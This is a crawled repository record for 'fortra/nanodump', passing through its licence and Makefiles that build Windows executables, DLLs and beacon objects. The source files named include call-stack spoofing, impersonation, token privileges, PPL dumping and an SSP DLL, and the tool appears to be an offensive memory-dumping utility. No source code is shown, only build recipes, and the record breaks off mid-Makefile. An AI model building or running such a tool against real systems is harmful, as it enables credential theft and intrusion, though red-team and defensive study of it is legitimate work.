{
  "metadata": {
    "timestamp": 1736710119980,
    "page": 755,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjc2MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "fortra/nanodump",
      "stars": 1839,
      "defaultBranch": "main",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.1787109375,
          "content": "*.dmp\n*.obj\ninclude/nanodump_ssp_dll.x64.h\ninclude/nanodump_ssp_dll.x86.h\ninclude/nanodump_ppl_dump_dll.x64.h\ninclude/nanodump_ppl_dump_dll.x86.h\ninclude/nanodump_ppl_medic_dll.x64.h\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.0380859375,
          "content": "MIT License\n\nCopyright (c) 2024 Fortra\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "Makefile.clang",
          "type": "blob",
          "size": 12.0546875,
          "content": "CC = clang\nSTRIP = strip\nBOFNAME = nanodump\nOPTIONS = -Wall -I include -Xclang\nRELEASE_OPTIONS = -g0\nDEBUG_OPTIONS = -DDEBUG\nPPL_MEDIC_OPTIONS = -Wno-trigraphs -DPASS_PARAMS_VIA_NAMED_PIPES=1\nSSP_OPTIONS = -DPASS_PARAMS_VIA_NAMED_PIPES=1\n\nnanodump: clean\n\t$(info ###### RELEASE ######)\n\n\t$(CC) -target x86_64-w64-windows-gnu source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c -o dist/$(BOFNAME).x64.exe $(OPTIONS) -DNANO -DEXE $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME).x64.exe\n\n\t$(CC) -target i686-pc-windows-gnu -m32 source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c -o dist/$(BOFNAME).x86.exe $(OPTIONS) -DNANO -DEXE $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME).x86.exe\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/entry.c -o dist/$(BOFNAME).x64.o $(OPTIONS) -DNANO -DBOF $(RELEASE_OPTIONS)\n#\t$(STRIP) dist/$(BOFNAME).x64.o\n\n#\t$(CC) -target i686-pc-windows-gnu -m32 -c source/entry.c -o dist/$(BOFNAME).x86.o $(OPTIONS) -DNANO -DBOF $(RELEASE_OPTIONS)\n#\t$(STRIP) dist/$(BOFNAME).x86.o\n\n\t$(CC) source/bin2c.c -o dist/bin2c -static -s -Os\n\n\t$(CC) -target x86_64-w64-windows-gnu source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/dinvoke.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ssp.x64.dll $(OPTIONS) $(SSP_OPTIONS) -DNANO -DSSP -DDDL -shared $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME)_ssp.x64.dll\n\t./dist/bin2c dist/$(BOFNAME)_ssp.x64.dll $(BOFNAME)_ssp_dll > include/$(BOFNAME)_ssp_dll.x64.h\n\n\t$(CC) -target i686-pc-windows-gnu -m32 source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/dinvoke.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ssp.x86.dll $(OPTIONS) $(SSP_OPTIONS) -DNANO -DSSP -DDDL -shared $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME)_ssp.x86.dll\n\t./dist/bin2c dist/$(BOFNAME)_ssp.x86.dll $(BOFNAME)_ssp_dll > include/$(BOFNAME)_ssp_dll.x86.h\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x64.o $(OPTIONS) $(SSP_OPTIONS) -DBOF -DSSP $(RELEASE_OPTIONS)\n#\t$(STRIP) dist/$(BOFNAME)_ssp.x64.o\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x86.o $(OPTIONS) $(SSP_OPTIONS) -DBOF -DSSP $(RELEASE_OPTIONS)\n#\t$(STRIP) dist/$(BOFNAME)_ssp.x86.o\n\n\t$(CC) -target x86_64-pc-windows-gnu source/utils.c source/syscalls.c source/dinvoke.c source/pipe.c source/ssp/ssp_utils.c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x64.exe $(OPTIONS) $(SSP_OPTIONS) -DEXE -DSSP $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME)_ssp.x64.exe\n\n\t$(CC) -target i686-pc-windows-gnu -m32 source/utils.c source/syscalls.c source/dinvoke.c source/pipe.c source/ssp/ssp_utils.c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x86.exe $(OPTIONS) $(SSP_OPTIONS) -DEXE -DSSP $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME)_ssp.x86.exe\n\n\t$(CC) -target x86_64-pc-windows-gnu source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c -o dist/$(BOFNAME)_ppl_dump.x64.dll $(OPTIONS) -DNANO -DPPL_DUMP -DDDL -shared $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME)_ppl_dump.x64.dll\n\t./dist/bin2c dist/$(BOFNAME)_ppl_dump.x64.dll $(BOFNAME)_ppl_dump_dll > include/$(BOFNAME)_ppl_dump_dll.x64.h\n\n\t$(CC) -target i686-pc-windows-gnu -m32 source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c -o dist/$(BOFNAME)_ppl_dump.x86.dll $(OPTIONS) -DNANO -DPPL_DUMP -DDDL -shared $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME)_ppl_dump.x86.dll\n\t./dist/bin2c dist/$(BOFNAME)_ppl_dump.x86.dll $(BOFNAME)_ppl_dump_dll > include/$(BOFNAME)_ppl_dump_dll.x86.h\n\n\t$(CC) -target x86_64-pc-windows-gnu source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_dump.c -o dist/$(BOFNAME)_ppl_dump.x64.exe $(OPTIONS) -DEXE -DPPL_DUMP $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME)_ppl_dump.x64.exe\n\n\t$(CC) -target i686-pc-windows-gnu -m32 source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_dump.c -o dist/$(BOFNAME)_ppl_dump.x86.exe $(OPTIONS) -DEXE -DPPL_DUMP $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME)_ppl_dump.x86.exe\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/ppl/ppl.c -o dist/$(BOFNAME)_ppl_dump.x64.o $(OPTIONS) -DBOF -DPPL_DUMP $(RELEASE_OPTIONS)\n#\t$(STRIP) dist/$(BOFNAME)_ppl_dump.x64.o\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/ppl/ppl.c -o dist/$(BOFNAME)_ppl_dump.x86.o $(OPTIONS) -DBOF -DPPL_DUMP $(RELEASE_OPTIONS)\n#\t$(STRIP) dist/$(BOFNAME)_ppl_dump.x86.o\n\n\t$(CC) -target x86_64-pc-windows-gnu source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/ppl/ppl_medic_dll.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ppl_medic.x64.dll $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DNANO -DPPL_MEDIC -DDDL -shared $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME)_ppl_medic.x64.dll\n\t./dist/bin2c dist/$(BOFNAME)_ppl_medic.x64.dll $(BOFNAME)_ppl_medic_dll > include/$(BOFNAME)_ppl_medic_dll.x64.h\n\n\t$(CC) -target x86_64-pc-windows-gnu source/utils.c source/syscalls.c source/dinvoke.c source/handle.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_medic.c source/pipe.c source/ppl/ppl_medic_client.c -o dist/$(BOFNAME)_ppl_medic.x64.exe $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DEXE -DPPL_MEDIC -DNANO $(RELEASE_OPTIONS)\n\t$(STRIP) dist/$(BOFNAME)_ppl_medic.x64.exe\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/ppl/ppl.c -o dist/$(BOFNAME)_ppl_medic.x64.o $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DBOF -DPPL_MEDIC $(RELEASE_OPTIONS)\n#\t$(STRIP) dist/$(BOFNAME)_ppl_medic.x64.o\n\n\t$(CC) source/restore_signature.c -o scripts/restore_signature -static -s -Os\n\t$(STRIP) scripts/restore_signature\n\ndebug: clean\n\t$(info ###### DEBUG ######)\n\n\t$(CC) -target x86_64-w64-windows-gnu source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c -o dist/$(BOFNAME).x64.exe $(OPTIONS) -DNANO -DEXE $(DEBUG_OPTIONS)\n\n\t$(CC) -target i686-pc-windows-gnu -m32 source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c -o dist/$(BOFNAME).x86.exe $(OPTIONS) -DNANO -DEXE $(DEBUG_OPTIONS)\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/entry.c -o dist/$(BOFNAME).x64.o $(OPTIONS) -DNANO -DBOF $(DEBUG_OPTIONS)\n\n#\t$(CC) -target i686-pc-windows-gnu -m32 -c source/entry.c -o dist/$(BOFNAME).x86.o $(OPTIONS) -DNANO -DBOF $(DEBUG_OPTIONS)\n\n\t$(CC) source/bin2c.c -o dist/bin2c -static -s -Os\n\n\t$(CC) -target x86_64-w64-windows-gnu source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/dinvoke.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ssp.x64.dll $(OPTIONS) $(SSP_OPTIONS) -DNANO -DSSP -DDDL -shared $(DEBUG_OPTIONS)\n\t./dist/bin2c dist/$(BOFNAME)_ssp.x64.dll $(BOFNAME)_ssp_dll > include/$(BOFNAME)_ssp_dll.x64.h\n\n\t$(CC) -target i686-pc-windows-gnu -m32 source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/dinvoke.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ssp.x86.dll $(OPTIONS) $(SSP_OPTIONS) -DNANO -DSSP -DDDL -shared $(DEBUG_OPTIONS)\n\t./dist/bin2c dist/$(BOFNAME)_ssp.x86.dll $(BOFNAME)_ssp_dll > include/$(BOFNAME)_ssp_dll.x86.h\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x64.o $(OPTIONS) $(SSP_OPTIONS) -DBOF -DSSP $(DEBUG_OPTIONS)\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x86.o $(OPTIONS) $(SSP_OPTIONS) -DBOF -DSSP $(DEBUG_OPTIONS)\n\n\t$(CC) -target x86_64-pc-windows-gnu source/utils.c source/syscalls.c source/dinvoke.c source/pipe.c source/ssp/ssp_utils.c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x64.exe $(OPTIONS) $(SSP_OPTIONS) -DEXE -DSSP $(DEBUG_OPTIONS)\n\n\t$(CC) -target i686-pc-windows-gnu -m32 source/utils.c source/syscalls.c source/dinvoke.c source/pipe.c source/ssp/ssp_utils.c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x86.exe $(OPTIONS) $(SSP_OPTIONS) -DEXE -DSSP $(DEBUG_OPTIONS)\n\n\t$(CC) -target x86_64-pc-windows-gnu source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c -o dist/$(BOFNAME)_ppl_dump.x64.dll $(OPTIONS) -DNANO -DPPL_DUMP -DDDL -shared $(DEBUG_OPTIONS)\n\t./dist/bin2c dist/$(BOFNAME)_ppl_dump.x64.dll $(BOFNAME)_ppl_dump_dll > include/$(BOFNAME)_ppl_dump_dll.x64.h\n\n\t$(CC) -target i686-pc-windows-gnu -m32 source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c -o dist/$(BOFNAME)_ppl_dump.x86.dll $(OPTIONS) -DNANO -DPPL_DUMP -DDDL -shared $(DEBUG_OPTIONS)\n\t./dist/bin2c dist/$(BOFNAME)_ppl_dump.x86.dll $(BOFNAME)_ppl_dump_dll > include/$(BOFNAME)_ppl_dump_dll.x86.h\n\n\t$(CC) -target x86_64-pc-windows-gnu source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_dump.c -o dist/$(BOFNAME)_ppl_dump.x64.exe $(OPTIONS) -DEXE -DPPL_DUMP $(DEBUG_OPTIONS)\n\n\t$(CC) -target i686-pc-windows-gnu -m32 source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_dump.c -o dist/$(BOFNAME)_ppl_dump.x86.exe $(OPTIONS) -DEXE -DPPL_DUMP $(DEBUG_OPTIONS)\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/ppl/ppl.c -o dist/$(BOFNAME)_ppl_dump.x64.o $(OPTIONS) -DBOF -DPPL_DUMP $(DEBUG_OPTIONS)\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/ppl/ppl.c -o dist/$(BOFNAME)_ppl_dump.x86.o $(OPTIONS) -DBOF -DPPL_DUMP $(DEBUG_OPTIONS)\n\n\t$(CC) -target x86_64-pc-windows-gnu source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/ppl/ppl_medic_dll.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ppl_medic.x64.dll $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DNANO -DPPL_MEDIC -DDDL -shared $(DEBUG_OPTIONS)\n\t./dist/bin2c dist/$(BOFNAME)_ppl_medic.x64.dll $(BOFNAME)_ppl_medic_dll > include/$(BOFNAME)_ppl_medic_dll.x64.h\n\n\t$(CC) -target x86_64-pc-windows-gnu source/utils.c source/syscalls.c source/dinvoke.c source/handle.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_medic.c source/pipe.c source/ppl/ppl_medic_client.c -o dist/$(BOFNAME)_ppl_medic.x64.exe $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DEXE -DPPL_MEDIC -DNANO $(DEBUG_OPTIONS)\n\n#\t$(CC) -target x86_64-pc-windows-gnu -c source/ppl/ppl.c -o dist/$(BOFNAME)_ppl_medic.x64.o $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DBOF -DPPL_MEDIC $(DEBUG_OPTIONS)\n\n\t$(CC) source/restore_signature.c -o scripts/restore_signature -static -s -Os\n\nclean:\n\trm -f dist/*\n"
        },
        {
          "name": "Makefile.mingw",
          "type": "blob",
          "size": 10.7587890625,
          "content": "BOFNAME := nanodump\nCC_x64 := x86_64-w64-mingw32-gcc\nCC_x86 := i686-w64-mingw32-gcc\nGCC := gcc\nSTRIP_x64 := x86_64-w64-mingw32-strip\nSTRIP_x86 := i686-w64-mingw32-strip\nOPTIONS := -masm=intel -Wall -I include -Wl,--dynamicbase\nPPL_MEDIC_OPTIONS := -Wno-trigraphs -DPASS_PARAMS_VIA_NAMED_PIPES=1\nSSP_OPTIONS := -DPASS_PARAMS_VIA_NAMED_PIPES=1\n\nnanodump: clean\n\t$(info ###### RELEASE ######)\n\n\t$(CC_x64) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c -o dist/$(BOFNAME).x64.exe $(OPTIONS) -DNANO -DEXE\n\t$(STRIP_x64) --strip-all dist/$(BOFNAME).x64.exe\n\n\t$(CC_x86) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c -o dist/$(BOFNAME).x86.exe $(OPTIONS) -DNANO -DEXE\n\t$(STRIP_x86) --strip-all dist/$(BOFNAME).x86.exe\n\n\t$(CC_x64) -c source/entry.c -o dist/$(BOFNAME).x64.o $(OPTIONS) -DNANO -DBOF\n\t$(STRIP_x64) --strip-unneeded dist/$(BOFNAME).x64.o\n\n\t$(CC_x86) -c source/entry.c -o dist/$(BOFNAME).x86.o $(OPTIONS) -DNANO -DBOF\n\t$(STRIP_x86) --strip-unneeded dist/$(BOFNAME).x86.o\n\n\t$(GCC) source/bin2c.c -o dist/bin2c -static -s -Os\n\n\t$(CC_x64) source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/dinvoke.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ssp.x64.dll $(OPTIONS) $(SSP_OPTIONS) -DNANO -DSSP -DDDL -shared\n\t$(STRIP_x64) --strip-all dist/$(BOFNAME)_ssp.x64.dll\n\t./dist/bin2c dist/$(BOFNAME)_ssp.x64.dll $(BOFNAME)_ssp_dll > include/$(BOFNAME)_ssp_dll.x64.h\n\n\t$(CC_x86) source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/dinvoke.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ssp.x86.dll $(OPTIONS) $(SSP_OPTIONS) -DNANO -DSSP -DDDL -shared\n\t$(STRIP_x86) --strip-all dist/$(BOFNAME)_ssp.x86.dll\n\t./dist/bin2c dist/$(BOFNAME)_ssp.x86.dll $(BOFNAME)_ssp_dll > include/$(BOFNAME)_ssp_dll.x86.h\n\n\t$(CC_x64) -c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x64.o $(OPTIONS) $(SSP_OPTIONS) -DBOF -DSSP\n\t$(STRIP_x64) --strip-unneeded dist/$(BOFNAME)_ssp.x64.o\n\n\t$(CC_x86) -c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x86.o $(OPTIONS) $(SSP_OPTIONS) -DBOF -DSSP\n\t$(STRIP_x86) --strip-unneeded dist/$(BOFNAME)_ssp.x86.o\n\n\t$(CC_x64) source/utils.c source/syscalls.c source/dinvoke.c source/pipe.c source/ssp/ssp_utils.c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x64.exe $(OPTIONS) $(SSP_OPTIONS) -DEXE -DSSP\n\t$(STRIP_x64) --strip-all dist/$(BOFNAME)_ssp.x64.exe\n\n\t$(CC_x86) source/utils.c source/syscalls.c source/dinvoke.c source/pipe.c source/ssp/ssp_utils.c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x86.exe $(OPTIONS) $(SSP_OPTIONS) -DEXE -DSSP\n\t$(STRIP_x86) --strip-all dist/$(BOFNAME)_ssp.x86.exe\n\n\t$(CC_x64) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c -o dist/$(BOFNAME)_ppl_dump.x64.dll $(OPTIONS) -DNANO -DPPL_DUMP -DDDL -shared\n\t$(STRIP_x64) --strip-all dist/$(BOFNAME)_ppl_dump.x64.dll\n\t./dist/bin2c dist/$(BOFNAME)_ppl_dump.x64.dll $(BOFNAME)_ppl_dump_dll > include/$(BOFNAME)_ppl_dump_dll.x64.h\n\n\t$(CC_x86) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c -o dist/$(BOFNAME)_ppl_dump.x86.dll $(OPTIONS) -DNANO -DPPL_DUMP -DDDL -shared\n\t$(STRIP_x86) --strip-all dist/$(BOFNAME)_ppl_dump.x86.dll\n\t./dist/bin2c dist/$(BOFNAME)_ppl_dump.x86.dll $(BOFNAME)_ppl_dump_dll > include/$(BOFNAME)_ppl_dump_dll.x86.h\n\n\t$(CC_x64) source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_dump.c -o dist/$(BOFNAME)_ppl_dump.x64.exe $(OPTIONS) -DEXE -DPPL_DUMP\n\t$(STRIP_x64) --strip-all dist/$(BOFNAME)_ppl_dump.x64.exe\n\n\t$(CC_x86) source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_dump.c -o dist/$(BOFNAME)_ppl_dump.x86.exe $(OPTIONS) -DEXE -DPPL_DUMP\n\t$(STRIP_x86) --strip-all dist/$(BOFNAME)_ppl_dump.x86.exe\n\n\t$(CC_x64) -c source/ppl/ppl.c -o dist/$(BOFNAME)_ppl_dump.x64.o $(OPTIONS) -DBOF -DPPL_DUMP\n\t$(STRIP_x64) --strip-unneeded dist/$(BOFNAME)_ppl_dump.x64.o\n\n\t$(CC_x86) -c source/ppl/ppl.c -o dist/$(BOFNAME)_ppl_dump.x86.o $(OPTIONS) -DBOF -DPPL_DUMP\n\t$(STRIP_x86) --strip-unneeded dist/$(BOFNAME)_ppl_dump.x86.o\n\n\t$(CC_x64) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/ppl/ppl_medic_dll.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ppl_medic.x64.dll $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DNANO -DPPL_MEDIC -DDDL -shared\n\t$(STRIP_x64) --strip-all dist/$(BOFNAME)_ppl_medic.x64.dll\n\t./dist/bin2c dist/$(BOFNAME)_ppl_medic.x64.dll $(BOFNAME)_ppl_medic_dll > include/$(BOFNAME)_ppl_medic_dll.x64.h\n\n\t$(CC_x64) source/utils.c source/syscalls.c source/dinvoke.c source/handle.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_medic.c source/pipe.c source/ppl/ppl_medic_client.c -o dist/$(BOFNAME)_ppl_medic.x64.exe $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DEXE -DPPL_MEDIC -DNANO\n\t$(STRIP_x64) --strip-all dist/$(BOFNAME)_ppl_medic.x64.exe\n\n\t$(CC_x64) -c source/ppl/ppl.c -o dist/$(BOFNAME)_ppl_medic.x64.o $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DBOF -DPPL_MEDIC\n\t$(STRIP_x64) --strip-unneeded dist/$(BOFNAME)_ppl_medic.x64.o\n\n\t$(GCC) source/restore_signature.c -o scripts/restore_signature -static -s -Os\n\t$(STRIP_x64) --strip-all scripts/restore_signature\n\ndebug: clean\n\t$(info ###### DEBUG ######)\n\n\t$(CC_x64) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c -o dist/$(BOFNAME).x64.exe $(OPTIONS) -DNANO -DEXE -DDEBUG\n\n\t$(CC_x86) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c -o dist/$(BOFNAME).x86.exe $(OPTIONS) -DNANO -DEXE -DDEBUG\n\n\t$(CC_x64) -c source/entry.c -o dist/$(BOFNAME).x64.o $(OPTIONS) -DNANO -DBOF -DDEBUG\n\n\t$(CC_x86) -c source/entry.c -o dist/$(BOFNAME).x86.o $(OPTIONS) -DNANO -DBOF -DDEBUG\n\n\t$(GCC) source/bin2c.c -o dist/bin2c -static -s -Os\n\n\t$(CC_x64) source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/dinvoke.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ssp.x64.dll $(OPTIONS) $(SSP_OPTIONS) -DNANO -DSSP -DDDL -shared -DDEBUG\n\t./dist/bin2c dist/$(BOFNAME)_ssp.x64.dll $(BOFNAME)_ssp_dll > include/$(BOFNAME)_ssp_dll.x64.h\n\n\t$(CC_x86) source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/dinvoke.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ssp.x86.dll $(OPTIONS) $(SSP_OPTIONS) -DNANO -DSSP -DDDL -shared -DDEBUG\n\t./dist/bin2c dist/$(BOFNAME)_ssp.x86.dll $(BOFNAME)_ssp_dll > include/$(BOFNAME)_ssp_dll.x86.h\n\n\t$(CC_x64) -c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x64.o $(OPTIONS) $(SSP_OPTIONS) -DBOF -DSSP -DDEBUG\n\n\t$(CC_x64) source/utils.c source/syscalls.c source/dinvoke.c source/pipe.c source/ssp/ssp_utils.c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x64.exe $(OPTIONS) $(SSP_OPTIONS) -DEXE -DSSP -DDEBUG\n\n\t$(CC_x86) source/utils.c source/syscalls.c source/dinvoke.c source/pipe.c source/ssp/ssp_utils.c source/ssp/ssp.c -o dist/$(BOFNAME)_ssp.x86.exe $(OPTIONS) $(SSP_OPTIONS) -DEXE -DSSP -DDEBUG\n\n\t$(CC_x64) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c -o dist/$(BOFNAME)_ppl_dump.x64.dll $(OPTIONS) -DNANO -DPPL_DUMP -DDDL -shared -DDEBUG\n\t./dist/bin2c dist/$(BOFNAME)_ppl_dump.x64.dll $(BOFNAME)_ppl_dump_dll > include/$(BOFNAME)_ppl_dump_dll.x64.h\n\n\t$(CC_x86) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c -o dist/$(BOFNAME)_ppl_dump.x86.dll $(OPTIONS) -DNANO -DPPL_DUMP -DDDL -shared -DDEBUG\n\t./dist/bin2c dist/$(BOFNAME)_ppl_dump.x86.dll $(BOFNAME)_ppl_dump_dll > include/$(BOFNAME)_ppl_dump_dll.x86.h\n\n\t$(CC_x64) source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_dump.c -o 